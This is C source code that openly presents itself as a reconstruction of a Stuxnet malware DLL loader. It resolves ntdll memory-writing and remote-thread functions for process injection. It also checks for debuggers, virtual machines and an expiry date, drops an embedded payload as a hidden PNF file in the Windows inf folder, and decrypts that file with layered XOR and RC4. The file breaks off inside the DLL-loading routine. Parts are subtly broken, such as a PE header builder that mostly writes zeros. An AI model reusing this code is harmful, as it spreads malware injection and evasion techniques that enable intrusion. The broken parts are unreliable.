/*
 * Reference from Main/Stuxnet.dll.c.
 */

#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "ntdll.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define OEM7A_MAGIC                     0x4F454D37
#define OEM7A_VERSION                   0x00010400
#define OEM7A_PNF_SIZE                  498176
#define OEM7A_MAX_PATH                  260
#define OEM7A_BUFFER_SIZE               4096
#define OEM7A_SECTION_STUB              ".stub"
#define OEM7A_RESOURCE_MAIN_DLL         1
#define OEM7A_ENCRYPTION_KEY            0x01AE0000
#define OEM7A_DECRYPTION_ROUNDS         3
#define OEM7A_PE_LOADER_SIZE            0x101C

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)
#define STATUS_INFO_LENGTH_MISMATCH     ((NTSTATUS)0xC0000004L)

#define NtCurrentProcess()              ((HANDLE)(LONG_PTR)-1)

typedef struct _OEM7A_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwEncryptedSize;
    DWORD dwDecryptedSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwReserved[8];
} OEM7A_HEADER, * POEM7A_HEADER;

typedef struct _OEM7A_INJECTION_ELEMENT {
    DWORD dwReserved1;
    WORD  wExportFunction;
    WORD  wFlags;
    DWORD dwKey;
    DWORD dwReserved2;
    DWORD dwProcessNameLength;
    WCHAR wszProcessName[64];
    DWORD dwFileNameLength;
    WCHAR wszFileName[64];
} OEM7A_INJECTION_ELEMENT, * POEM7A_INJECTION_ELEMENT;

typedef struct _OEM7A_DRIVER_CONFIG {
    DWORD dwNumberOfInjections;
    OEM7A_INJECTION_ELEMENT Elements[16];
} OEM7A_DRIVER_CONFIG, * POEM7A_DRIVER_CONFIG;

typedef struct _OEM7A_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[OEM7A_MAX_PATH];
    WCHAR szSystemPath[OEM7A_MAX_PATH];
    WCHAR szWindowsPath[OEM7A_MAX_PATH];
    WCHAR szInfPath[OEM7A_MAX_PATH];
    WCHAR szPNFPath[OEM7A_MAX_PATH];
    BYTE bReserved[256];
} OEM7A_CTX, * POEM7A_CTX;

typedef struct _OEM7A_PE_LOADER_CTX {
    PVOID pImageBase;
    DWORD dwImageSize;
    DWORD dwEntryPoint;
    PVOID pLoadLibraryA;
    PVOID pGetProcAddress;
    PVOID pVirtualAlloc;
    PVOID pVirtualFree;
    PVOID pExitProcess;
    DWORD dwRelocDelta;
    BOOL bIs64Bit;
    BYTE bReserved[128];
} OEM7A_PE_LOADER_CTX, * POEM7A_PE_LOADER_CTX;

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_NtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_NtCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *PFN_NtClose)(HANDLE Handle);

typedef NTSTATUS (NTAPI *PFN_ZwQuerySystemInformation)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

typedef NTSTATUS (NTAPI *PFN_ZwAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *PFN_ZwWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *PFN_ZwProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T NumberOfBytesToProtect,
    ULONG NewAccessProtection,
    PULONG OldAccessProtection
);

typedef NTSTATUS (NTAPI *PFN_ZwCreateThreadEx)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList
);

typedef NTSTATUS (NTAPI *PFN_ZwClose)(HANDLE Handle);

static OEM7A_CTX g_Oem7aCtx;
static BOOL g_bInitialized = FALSE;
static PFN_NtAllocateVirtualMemory pNtAllocateVirtualMemory = NULL;
static PFN_NtWriteVirtualMemory pNtWriteVirtualMemory = NULL;
static PFN_NtProtectVirtualMemory pNtProtectVirtualMemory = NULL;
static PFN_NtCreateThreadEx pNtCreateThreadEx = NULL;
static PFN_NtClose pNtClose = NULL;
static PFN_ZwAllocateVirtualMemory pZwAllocateVirtualMemory = NULL;
static PFN_ZwWriteVirtualMemory pZwWriteVirtualMemory = NULL;
static PFN_ZwProtectVirtualMemory pZwProtectVirtualMemory = NULL;
static PFN_ZwCreateThreadEx pZwCreateThreadEx = NULL;
static PFN_ZwClose pZwClose = NULL;

static DWORD g_dwInfectionCount = 0;
static DWORD g_dwInjectionCount = 0;
static DWORD g_dwDecryptionCount = 0;
static DWORD g_dwPELoadCount = 0;

static OEM7A_DRIVER_CONFIG g_DriverConfig = {0};

static BYTE g_EncryptionKey[32] = {
    0x7C, 0x4B, 0x3D, 0x2A, 0x9E, 0xF1, 0x8C, 0x57,
    0x3A, 0x6D, 0x82, 0x19, 0xE4, 0x5F, 0x0B, 0x26,
    0x91, 0x3E, 0x7A, 0x4F, 0xC2, 0x5D, 0x18, 0x63,
    0x8F, 0x2C, 0x79, 0x16, 0x4E, 0xA5, 0x3B, 0xE0
};

static BYTE g_PELoaderStub[OEM7A_PE_LOADER_SIZE] = {0};

static BOOL OEM7A_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    pNtAllocateVirtualMemory = (PFN_NtAllocateVirtualMemory)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
    pNtWriteVirtualMemory = (PFN_NtWriteVirtualMemory)GetProcAddress(hNtdll, "NtWriteVirtualMemory");
    pNtProtectVirtualMemory = (PFN_NtProtectVirtualMemory)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
    pNtCreateThreadEx = (PFN_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
    pNtClose = (PFN_NtClose)GetProcAddress(hNtdll, "NtClose");
    pZwAllocateVirtualMemory = (PFN_ZwAllocateVirtualMemory)GetProcAddress(hNtdll, "ZwAllocateVirtualMemory");
    pZwWriteVirtualMemory = (PFN_ZwWriteVirtualMemory)GetProcAddress(hNtdll, "ZwWriteVirtualMemory");
    pZwProtectVirtualMemory = (PFN_ZwProtectVirtualMemory)GetProcAddress(hNtdll, "ZwProtectVirtualMemory");
    pZwCreateThreadEx = (PFN_ZwCreateThreadEx)GetProcAddress(hNtdll, "ZwCreateThreadEx");
    pZwClose = (PFN_ZwClose)GetProcAddress(hNtdll, "ZwClose");
    if (!pNtAllocateVirtualMemory || !pNtWriteVirtualMemory || !pNtProtectVirtualMemory ||
        !pNtCreateThreadEx || !pNtClose) {
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM7A_Init(VOID) {
    DWORD dwMajor, dwMinor, dwBuild;
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_Oem7aCtx, sizeof(OEM7A_CTX));
    g_Oem7aCtx.dwMagic = OEM7A_MAGIC;
    g_Oem7aCtx.dwVersion = OEM7A_VERSION;
    g_Oem7aCtx.dwPid = GetCurrentProcessId();
    g_Oem7aCtx.dwTid = GetCurrentThreadId();
    g_Oem7aCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_Oem7aCtx.csLock);
    GetModuleFileNameW(NULL, g_Oem7aCtx.szModulePath, OEM7A_MAX_PATH);
    GetSystemDirectoryW(g_Oem7aCtx.szSystemPath, OEM7A_MAX_PATH);
    GetWindowsDirectoryW(g_Oem7aCtx.szWindowsPath, OEM7A_MAX_PATH);
    wsprintfW(g_Oem7aCtx.szInfPath, L"%s\\inf", g_Oem7aCtx.szWindowsPath);
    wsprintfW(g_Oem7aCtx.szPNFPath, L"%s\\oem7A.PNF", g_Oem7aCtx.szInfPath);
    OEM7A_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID OEM7A_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_Oem7aCtx.hMutex) {
        CloseHandle(g_Oem7aCtx.hMutex);
        g_Oem7aCtx.hMutex = NULL;
    }
    if (g_Oem7aCtx.hThread) {
        CloseHandle(g_Oem7aCtx.hThread);
        g_Oem7aCtx.hThread = NULL;
    }
    if (g_Oem7aCtx.hStopEvent) {
        CloseHandle(g_Oem7aCtx.hStopEvent);
        g_Oem7aCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_Oem7aCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL OEM7A_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_Oem7aCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL OEM7A_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL OEM7A_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    DWORD dwDebugPort = 0;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    if (pNtAllocateVirtualMemory) {
        NTSTATUS status = pNtAllocateVirtualMemory(
            NtCurrentProcess(),
            &dwDebugPort,
            0,
            (PSIZE_T)&dwDebugPort,
            MEM_COMMIT,
            PAGE_READWRITE
        );
        if (NT_SUCCESS(status)) {
            pNtProtectVirtualMemory(
                NtCurrentProcess(),
                (PVOID*)&dwDebugPort,
                (PSIZE_T)&dwDebugPort,
                PAGE_NOACCESS,
                NULL
            );
        }
    }
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL OEM7A_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD OEM7A_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID OEM7A_XORDecrypt(PBYTE pData, DWORD dwSize, PBYTE pKey, DWORD dwKeySize) {
    DWORD i;
    if (!pData || dwSize == 0 || !pKey || dwKeySize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= pKey[i % dwKeySize];
    }
}

static VOID OEM7A_RC4Init(PBYTE pKey, DWORD dwKeySize, PBYTE pSBox) {
    DWORD i, j;
    BYTE temp;
    if (!pKey || dwKeySize == 0 || !pSBox) return;
    for (i = 0; i < 256; i++) {
        pSBox[i] = (BYTE)i;
    }
    j = 0;
    for (i = 0; i < 256; i++) {
        j = (j + pSBox[i] + pKey[i % dwKeySize]) & 0xFF;
        temp = pSBox[i];
        pSBox[i] = pSBox[j];
        pSBox[j] = temp;
    }
}

static VOID OEM7A_RC4Crypt(PBYTE pData, DWORD dwSize, PBYTE pSBox, PDWORD pdwI, PDWORD pdwJ) {
    DWORD i;
    BYTE temp;
    if (!pData || dwSize == 0 || !pSBox || !pdwI || !pdwJ) return;
    for (i = 0; i < dwSize; i++) {
        *pdwI = (*pdwI + 1) & 0xFF;
        *pdwJ = (*pdwJ + pSBox[*pdwI]) & 0xFF;
        temp = pSBox[*pdwI];
        pSBox[*pdwI] = pSBox[*pdwJ];
        pSBox[*pdwJ] = temp;
        pData[i] ^= pSBox[(pSBox[*pdwI] + pSBox[*pdwJ]) & 0xFF];
    }
}

static VOID OEM7A_SimpleDecrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static VOID OEM7A_SimpleEncrypt(PBYTE pData, DWORD dwSize) {
    DWORD i;
    BYTE key = 0xA3;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= key;
        key = (key * 7 + 0x13) & 0xFF;
    }
}

static BOOL OEM7A_DecryptPNF(PBYTE pEncrypted, DWORD dwEncryptedSize, PBYTE pDecrypted, PDWORD pdwDecryptedSize) {
    POEM7A_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwDataSize;
    DWORD dwKey = OEM7A_ENCRYPTION_KEY;
    if (!pEncrypted || dwEncryptedSize == 0 || !pDecrypted || !pdwDecryptedSize) {
        return FALSE;
    }
    if (dwEncryptedSize < sizeof(OEM7A_HEADER)) {
        return FALSE;
    }
    pHeader = (POEM7A_HEADER)pEncrypted;
    if (pHeader->dwMagic != OEM7A_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        return FALSE;
    }
    dwDataSize = dwEncryptedSize - sizeof(OEM7A_HEADER);
    if (dwDataSize > *pdwDecryptedSize) {
        return FALSE;
    }
    memcpy(pDecrypted, pEncrypted + sizeof(OEM7A_HEADER), dwDataSize);
    for (DWORD round = 0; round < OEM7A_DECRYPTION_ROUNDS; round++) {
        OEM7A_XORDecrypt(pDecrypted, dwDataSize, (PBYTE)&dwKey, sizeof(DWORD));
        OEM7A_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM7A_RC4Crypt(pDecrypted, dwDataSize, SBox, &i, &j);
        OEM7A_SimpleDecrypt(pDecrypted, dwDataSize);
    }
    *pdwDecryptedSize = dwDataSize;
    g_dwDecryptionCount++;
    return TRUE;
}

static BOOL OEM7A_EncryptPNF(PBYTE pDecrypted, DWORD dwDecryptedSize, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    POEM7A_HEADER pHeader;
    BYTE SBox[256];
    DWORD i = 0, j = 0;
    DWORD dwTotalSize;
    DWORD dwKey = OEM7A_ENCRYPTION_KEY;
    if (!pDecrypted || dwDecryptedSize == 0 || !pEncrypted || !pdwEncryptedSize) {
        return FALSE;
    }
    dwTotalSize = sizeof(OEM7A_HEADER) + dwDecryptedSize;
    if (dwTotalSize > *pdwEncryptedSize) {
        return FALSE;
    }
    pHeader = (POEM7A_HEADER)pEncrypted;
    pHeader->dwMagic = OEM7A_MAGIC;
    pHeader->dwVersion = OEM7A_VERSION;
    pHeader->dwTotalSize = dwTotalSize;
    pHeader->dwEncryptedSize = dwDecryptedSize;
    pHeader->dwDecryptedSize = dwDecryptedSize;
    pHeader->dwChecksum = OEM7A_ComputeCRC32(pDecrypted, dwDecryptedSize);
    pHeader->dwTimestamp = GetTickCount();
    ZeroMemory(pHeader->dwReserved, sizeof(pHeader->dwReserved));
    memcpy(pEncrypted + sizeof(OEM7A_HEADER), pDecrypted, dwDecryptedSize);
    for (DWORD round = 0; round < OEM7A_DECRYPTION_ROUNDS; round++) {
        OEM7A_SimpleEncrypt(pEncrypted + sizeof(OEM7A_HEADER), dwDecryptedSize);
        OEM7A_RC4Init((PBYTE)&dwKey, sizeof(DWORD), SBox);
        OEM7A_RC4Crypt(pEncrypted + sizeof(OEM7A_HEADER), dwDecryptedSize, SBox, &i, &j);
        OEM7A_XORDecrypt(pEncrypted + sizeof(OEM7A_HEADER), dwDecryptedSize, (PBYTE)&dwKey, sizeof(DWORD));
    }
    *pdwEncryptedSize = dwTotalSize;
    return TRUE;
}

static BOOL OEM7A_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    return TRUE;
}

static BOOL OEM7A_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    return TRUE;
}

static BOOL OEM7A_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(OEM7A_RESOURCE_MAIN_DLL), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL OEM7A_BuildPELoader(VOID) {
    PIMAGE_DOS_HEADER pDos;
    PIMAGE_NT_HEADERS pNt;
    PIMAGE_SECTION_HEADER pSec;
    DWORD dwSize;
    BYTE *pLoader;
    DWORD dwOffset = 0;
    DWORD dwRelocDelta = 0;
    dwSize = OEM7A_PE_LOADER_SIZE;
    pLoader = g_PELoaderStub;
    *(DWORD*)(pLoader + dwOffset) = 0x4D5A9000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000003;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000004;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0xFFFF0000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x000000B8;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000040;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000080;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(WORD*)(pLoader + dwOffset) = 0x0E1F;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0xBA0E;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x00B4;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x09CD;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0xB821;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x4C01;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x21CD;
    dwOffset += 2;
    memcpy(pLoader + dwOffset, "This program cannot be run in DOS mode.", 40);
    dwOffset += 40;
    for (DWORD i = 0; i < 64; i++) {
        *(DWORD*)(pLoader + dwOffset) = 0x00000000;
        dwOffset += 4;
    }
    *(DWORD*)(pLoader + dwOffset) = 0x00004550;
    dwOffset += 4;
    *(WORD*)(pLoader + dwOffset) = 0x014C;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x0001;
    dwOffset += 2;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(WORD*)(pLoader + dwOffset) = 0x00E0;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x000F;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x010B;
    dwOffset += 2;
    *(WORD*)(pLoader + dwOffset) = 0x0000;
    dwOffset += 2;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00001000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00002000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00001000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00004000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    *(DWORD*)(pLoader + dwOffset) = 0x00000000;
    dwOffset += 4;
    return TRUE;
}

static BOOL OEM7A_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!OEM7A_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    if (!OEM7A_WritePNFToDisk(g_Oem7aCtx.szPNFPath, pData, dwSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL OEM7A_LoadMainDLL(VOID) {
    PBYTE pEncrypted;
    PBYTE pDecrypted;
    DWORD dwEncryptedSize;
    DWORD dwDecryptedSize;
    HMODULE hModule;
    FARPROC pExport;
    WCHAR szAslrPath[OEM7A_MAX_PATH];
    DWORD dwRandom;
    if (!OEM7A_ReadPNFFromDisk(g_Oem7aCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return FALSE;
    }
    dwDecryptedSize = dwEncryptedSize + 4096;
    pDecrypted = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwDecryptedSize);
    if (!pDecrypted) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return FALSE;
    }
    if (!OEM7A_DecryptPNF(pEncrypted, dwEncryptedSize, pDecrypted, &dwDecryptedSize)) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        HeapFree(GetProcessHeap(), 0, pDecrypted);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    wcscpy_s(szAslrPath, OEM7A_MAX_PATH, g_Oem7aCtx.szWindowsPath);
    wcscat_s(szAslrPath, OEM7A_MAX_PATH, L"\\");
    wcscat_s(szAslrPath, OEM7A_MAX_PATH, L"KERNEL32.DLL.ASLR.");
